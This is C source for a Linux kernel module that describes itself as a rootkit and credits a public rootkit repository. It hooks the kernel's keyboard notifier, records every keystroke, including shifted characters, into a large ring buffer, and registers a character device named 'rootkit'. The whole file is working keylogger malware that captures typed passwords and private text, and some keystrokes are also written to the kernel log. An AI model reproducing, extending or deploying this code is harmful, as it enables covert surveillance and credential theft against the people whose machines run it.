/** https://github.com/maK-/maK_it-Linux-Rootkit */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/errno.h>
#include <linux/mempolicy.h>
#include <linux/types.h>
#include <linux/unistd.h>
#include <linux/string.h>
#include <asm/current.h>
#include <linux/sched.h>
#include <linux/syscalls.h>
//#include <asm/system.h>
#include <linux/fs.h>
#include <linux/keyboard.h>
#include <linux/input.h>
#include <linux/semaphore.h>
#include <linux/kmod.h>
#include <linux/notifier.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Malware Team");
MODULE_DESCRIPTION("A rootkit");
MODULE_VERSION("1.0.0");
MODULE_SUPPORTED_DEVICE("None");

#define DEVICE_NAME "rootkit"
#define CLASS_NAME "root" 
#define MAX_CMD_LENGTH 20

int 			debug = 0;
int 			keyLogOn = 1;
static int 	shiftPressed = 0;
static int	majorNumber;

char 			keyBuffer[1000000];
char 			commands[MAX_CMD_LENGTH];
char* 		basePtr = keyBuffer;
const char* endPtr = (keyBuffer+(sizeof(keyBuffer)-1));

struct semaphore s;
struct task_struct *task;

static struct class*		rootkitClass  = NULL;
static struct device*	rootkitDevice = NULL;

static const char* keys[] = {"","[ESC]","1","2","3","4","5","6","7","8","9",
				"0","-","=","[BS]","[TAB]","q","w","e","r",
				"t","y","u","i","o","p","[","]","[ENTR]",
				"[CTRL]","a","s","d","f","g","h","j","k","l",
				";","'","`","[SHFT]","\\","z","x","c","v","b",
				"n","m",",",".","/","[SHFT]","",""," ",
				"[CAPS]","[F1]","[F2]","[F3]","[F4]","[F5]",
				"[F6]","[F7]","[F8]","[F9]","[F10]","[NUML]",
				"[SCRL]","[HOME]","[UP]","[PGUP]","-","[L]","5",
				"[R]","+","[END]","[D]","[PGDN]","[INS]",
				"[DEL]","","","","[F11]","[F12]","",
				"","","","","","","[ENTR]","[CTRL]",
				"/","[PSCR]","[ALT]","","[HOME]","[U]",
				"[PGUP]","[L]","[R]","[END]","[D]","[PGDN]",
				"[INS]","[DEL]","","","","","","","","[PAUS]"};
//Key press with shift
static const char* keysShift[] = {"","[ESC]","!","@","#","$","%","^","&","*",
				"(",")","_","+","[BS]","[TAB]","Q","W","E","R",
				"T","Y","U","I","O","P","{","}","[ENTR]",
				"[CTRL]","A","S","D","F","G","H","J","K","L",
				":","\"","~","[SHFT]","|","Z","X","C","V","B",
				"N","M","<",">","?","[SHFT]","",""," ",
				"[CAPS]","[F1]","[F2]","[F3]","[F4]","[F5]",
				"[F6]","[F7]","[F8]","[F9]","[F10]","[NUML]",
				"[SCRL]","[HOME]","[U]","[PGUP]","-","[L]","5",
				"[R]","+","[END]","[D]","[PGDN]","[INS]",
				"[DEL]","","","","[F11]","[F12]","",
				"","","","","","","[ENTR]","[CTRL]",
				"/","[PSCR]","[ALT]","","[HOME]","[U]",
				"[PGUP]","[L]","[R]","[END]","[D]","[PGDN]",
				"[INS]","[DEL]","","","","","","","","[PAUS]"};

int key_notify(struct notifier_block *nblock, unsigned long kcode, void *p);

struct file_operations fops = {
    .owner = THIS_MODULE,
};

static struct notifier_block nb = {
    .notifier_call = key_notify
};

static int __init rootkit_init(void){
	register_keyboard_notifier(&nb);
	sema_init(&s, 1);
	
	printk(KERN_INFO "Device Driver has been called.");
	
	majorNumber = register_chrdev(0, DEVICE_NAME, &fops);
	if (majorNumber<0){
		printk(KERN_ALERT "rootkit failed to register a major number\n");
		return majorNumber;
	}
	else printk(KERN_INFO "rootkit: registered correctly with major number %d\n", majorNumber);
	
	rootkitClass = class_create(THIS_MODULE, CLASS_NAME);
	if (IS_ERR(rootkitClass)){                // Check for error and clean up if there is
		unregister_chrdev(majorNumber, DEVICE_NAME);
		printk(KERN_ALERT "Failed to register device class\n");
		return PTR_ERR(rootkitClass);          // Correct way to return an error on a pointer
	}	
	else printk(KERN_INFO "rootkit: device class registered correctly\n");
	
	rootkitDevice = device_create(rootkitClass, NULL, MKDEV(majorNumber, 0), NULL, DEVICE_NAME);
	if (IS_ERR(rootkitDevice)){               // Clean up if there is an error
		class_destroy(rootkitClass);           // Repeated code but the alternative is goto statements
		unregister_chrdev(majorNumber, DEVICE_NAME);
		printk(KERN_ALERT "Failed to create the device\n");
		return PTR_ERR(rootkitDevice);
	}
	else printk(KERN_INFO "rootkit: device class created correctly\n");

	return 0;
}

static void __exit rootkit_exit(void){
	unregister_keyboard_notifier(&nb);
	device_destroy(rootkitClass, MKDEV(majorNumber, 0));     // remove the device
	class_unregister(rootkitClass);                          // unregister the device class
	class_destroy(rootkitClass);                             // remove the device class
	unregister_chrdev(majorNumber, DEVICE_NAME);             // unregister the major number
	printk(KERN_INFO "Goodbye my love.\n");
	return;
}

module_init(rootkit_init);
module_exit(rootkit_exit);

int key_notify(struct notifier_block *nblock, unsigned long kcode, void *p){
	struct keyboard_notifier_param *param = p;
   	if(kcode == KBD_KEYCODE && keyLogOn){
        if( param->value==42 || param->value==54 ){
            down(&s);
            if(param->down > 0){
                shiftPressed = 1;
			}
            else{
                shiftPressed = 0;
			}
            up(&s);
            return NOTIFY_OK;
        }
		//Store keys to buffer
        if(param->down){
            int i;
			char c;
			down(&s);
			i = 0;
			if(shiftPressed){
				while(i < strlen(keysShift[param->value])){
				   c = keysShift[param->value][i];
					printk(KERN_INFO "Key %d\n", c);
					i++;
					*basePtr = c;
                    basePtr++;
                    if(basePtr == endPtr){
						basePtr = keyBuffer;
					}
				}
			}
            else{
				while(i < strlen(keys[param->value])){
                    c = keys[param->value][i];
                    i++;
                    *basePtr = c;
                    basePtr++;
                    if(basePtr == endPtr){
                        basePtr = keyBuffer;
                    }
                }
            }    
            up(&s);
        }
    }
 	return NOTIFY_OK;
}
